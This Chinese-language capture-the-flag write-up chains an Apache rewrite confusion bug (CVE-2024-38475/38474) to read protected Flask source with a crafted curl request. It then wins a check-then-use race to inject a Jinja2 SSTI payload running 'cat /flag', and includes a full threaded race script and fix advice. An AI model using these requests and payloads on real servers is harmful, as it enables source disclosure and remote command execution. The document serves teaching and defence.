# Level 38475 角落

## 题目简述

题目由 Apache HTTP Server 与后端 Flask 应用组成。Apache 配置同时使用了文件级访问控制、`mod_rewrite` 和反向代理；后端则把用户消息写入共享文件，并在读取时动态渲染。利用链分为两段：先借助 Apache Confusion Attack 读取受保护的 `app.py`，再对 Flask 的两次文件读取制造竞态，使恶意 Jinja2 表达式绕过检查并进入 `render_template_string`。

## 解题过程

### 1. 从 `robots.txt` 定位 Apache 配置

访问 `robots.txt` 后可找到 `app.conf`。关键配置如下：

```apache
<Directory "/usr/local/apache2/app">
    Options Indexes
    AllowOverride None
    Require all granted
</Directory>

<Files "/usr/local/apache2/app/app.py">
    Order Allow,Deny
    Deny from all
</Files>

RewriteEngine On
RewriteCond "%{HTTP_USER_AGENT}" "^L1nk/"
RewriteRule "^/admin/(.*)$" "/$1.html?secret=todo"

ProxyPass "/app/" "http://127.0.0.1:5000/"
```

配置暴露了源码的绝对路径 `/usr/local/apache2/app/app.py`。正常直接请求该文件会命中 `<Files>` 的拒绝规则，但满足特定 User-Agent 的 `/admin/...` 请求会进入重写规则。

### 2. 利用 Apache 路径语义混淆读取源码

发送如下请求：

```bash
curl -H 'User-Agent: L1nk/exploit' \
  'http://challenge.example/admin/usr/local/apache2/app/app.py%3f'
```

这里有两个相互配合的语义差异：

1. 重写结果的首段可被解释为文件系统绝对路径，使 `/usr/local/apache2/app/app.py` 落到可直接读取的位置；
2. 回溯引用中的编码问号 `%3f` 在后续 URL 语义中成为 `?`，截断规则自动附加的 `.html?secret=todo`。

因此，访问控制阶段和最终文件映射阶段看到的目标并不一致，最终响应返回了 `app.py` 源码。题目标题只写了 “38475”，但这里不宜把所有细节都笼统归到一个编号下：Apache 官方将“替换首段被解释为文件系统路径”列为 CVE-2024-38475，将“回溯引用中的编码问号”列为 CVE-2024-38474。二者同属 Orange Tsai 总结的 Apache [Confusion Attacks](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/) 研究。

### 3. 分析 Flask 中的检查与使用时序

源码中的关键路由为：

```python
@app.route("/read", methods=["GET"])
def read_message():
    if "{" not in readmsg():
        show = show_msg.replace("{{message}}", readmsg())
        return render_template_string(show)
    return "waf!!"
```

开发者试图通过检查消息中是否含有 `{` 来拦截 Jinja2 表达式，但 `readmsg()` 被调用了两次：

- 第一次读取只用于安全检查；
- 第二次读取才被拼入模板并渲染。

消息又由另一个 `/send` 请求写入共享文件。若第一次读取时文件内容是普通文本，而在第二次读取前由并发请求改写成 SSTI 载荷，检查值与使用值就不同。这是典型的 TOCTOU（检查时与使用时）竞态。

可用的 Jinja2 载荷从 Flask 配置对象对应函数的全局命名空间取得 `os`，再执行 `cat /flag`：

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
```

下面的脚本先写入安全文本，再并发发出恶意写入和读取请求。竞态具有概率性，因此应检查响应而不是假定某一次请求必然成功：

```python
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

BASE_URL = "http://challenge.example"
SAFE = "hello"
PAYLOAD = (
    "{{config.__class__.__init__.__globals__['os']"
    ".popen('cat /flag').read()}}"
)


def send_message(message):
    return requests.post(
        f"{BASE_URL}/app/send",
        data={"message": message},
        timeout=5,
    )


def read_message():
    return requests.get(f"{BASE_URL}/app/read", timeout=5).text


send_message(SAFE).raise_for_status()

for round_id in range(200):
    with ThreadPoolExecutor(max_workers=24) as pool:
        jobs = []
        for i in range(8):
            jobs.append(pool.submit(send_message, SAFE + str(i)))
            jobs.append(pool.submit(send_message, PAYLOAD + str(i)))
            jobs.append(pool.submit(read_message))

        for job in as_completed(jobs):
            result = job.result()
            if isinstance(result, str) and "hgame{" in result:
                print(result)
                raise SystemExit

print("本轮未命中竞态，可重新运行")
```

命中时，`/read` 返回的模板渲染结果中会出现 flag。原 PDF 没有保存 flag 的具体字符串，因此不在此猜测补全。

## 方法总结

本题把代理层和应用层的两个缺陷串在一起。第一段利用 Apache 各模块对路径、URL 和问号的不同解释，绕过文件访问控制并得到后端源码；第二段利用同一共享文件在“检查”和“渲染”之间可被并发修改的窗口，将 SSTI 载荷送入模板引擎。修复时应升级 Apache 至已修复版本并收紧危险的重写规则；应用侧则必须只读取一次消息，将同一个不可变值同时用于校验和后续处理，并避免对用户输入调用 `render_template_string`。
